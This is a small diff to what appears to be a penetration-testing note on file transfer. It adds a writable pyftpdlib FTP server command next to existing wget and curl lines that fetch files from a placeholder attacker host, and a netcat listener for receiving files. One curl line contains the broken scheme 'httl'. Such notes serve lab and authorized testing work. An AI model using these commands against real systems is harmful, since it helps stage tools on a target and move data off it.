@@ -9,6 +9,11 @@ wget http://<lhost>:8000/<file>
 curl httl://<lhost>:8000/<file> -O
 ```
 
+FTP Server:
+```
+python -m pyftpdlib -p 21 -w
+```
+
 Netcat
 ```
 nc -nvlp <lport> > file         # local machine
